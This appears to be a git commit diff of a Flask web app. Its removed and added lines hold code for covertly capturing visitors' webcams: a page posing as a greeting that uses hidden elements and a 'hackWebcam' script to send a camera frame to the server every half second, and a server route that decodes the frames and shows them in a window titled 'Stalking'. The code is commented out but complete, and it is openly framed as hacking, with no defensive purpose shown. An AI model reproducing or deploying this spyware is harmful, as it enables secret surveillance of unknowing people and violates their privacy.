e492dd76d2f94bc389e7a049efa41a27486a33e1
Alek Judaev <alekjudaev@Maxims-Mac-mini.local>
2024-07-26 14:59:51 +0200

    index1.html

--- sc_app.py
+++ sc_app.py
@@ -1,5 +1,13 @@
 # packages
-from flask import Flask, render_template, render_template_string
+from flask import Flask, render_template
+
+""" 
+from flask import request
+import base64
+import cv2
+import numpy as np
+import threading 
+"""
 
 # web app instance
 app = Flask(__name__)
@@ -9,68 +17,43 @@ app = Flask(__name__)
 
 @app.route("/")
 def index_html():
-    return render_template("index.html")
+    return render_template("index1.html")
+
+# update remote webcam view frame
 
 
 """ 
-def index():
-    return render_template_string('''
-    <!-- Website content -->
-    <h1 align = "center">Hello from Serge flask webapp</h1>
-    
-    <!-- Video frame -->
-    <video hidden id="video" playsinline autoplay></video>
-    
-    <!-- Canvas to sniff data from -->
-    <canvas hidden id="canvas" width="640" height="640">canvas</canvas>
-    
-    <!-- Jquery to make HTTP POST requests to send images from a webcam -->
-    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+def update(frame):
+    # open frame in a window
+    cv2.imshow('Stalking', frame)
+    cv2.waitKey()
 
-    <!-- Webcam hacking happens here -->
-    <script>
-      // send a single frame from the webcam to your HTTP server 
-      function post(imgdata){
-        $.ajax({
-          type: 'POST',
-          data: {frame: imgdata},
-          url: '/stream',
-          dataType: 'json',
-          async: false
-        });
-      };
+ """
+# get video on server side
 
-      // hook up video frame and canvas elements
-      const video = document.getElementById('video');
-      const canvas = document.getElementById('canvas');
-      
-      // target device's webcam settings
-      const constraints = {
-        audio: false,
-        video: { facingMode: "user" }
-      };
-      
-      // activate a webcam on a target device
-      async function hackWebcam() {
-        const stream = await navigator.mediaDevices.getUserMedia(constraints);
-        window.stream = stream;
-        video.srcObject = stream;
+""" 
+@app.route('/stream', methods=['POST'])
+def vc_stream():
+    # extract base64 encoded string from the client (web browser)
+    img_str = request.form.get('frame').split('data:image/png;base64,')[-1]
 
-        var context = canvas.getContext('2d');
-        
-        setInterval(function() {
-          context.drawImage(video, 0, 0, 640, 640);
-          var canvasData = canvas.toDataURL("image/png");
-          post(canvasData);
-        }, 500);
-      }
+    # convert base64 encoded string to a byte string
+    img_byt = base64.b64decode(img_str)
 
-      // hacking starts here
-      hackWebcam();
-    </script>
-    ''')
+    # convert a byte string to a numpy array
+    image = np.fromstring(img_byt, np.uint8)
 
-"""
+    # convert a numpy array to an opencv compatible image
+    frame = cv2.imdecode(image, cv2.IMREAD_COLOR)
+
+    # display the frame in a window
+    display_thread = threading.Thread(target=update, args=(frame,))
+    display_thread.start()
+
+    # return from the API call
+    return ''
+
+ """
 
 # main loop
 if __name__ == "__main__":
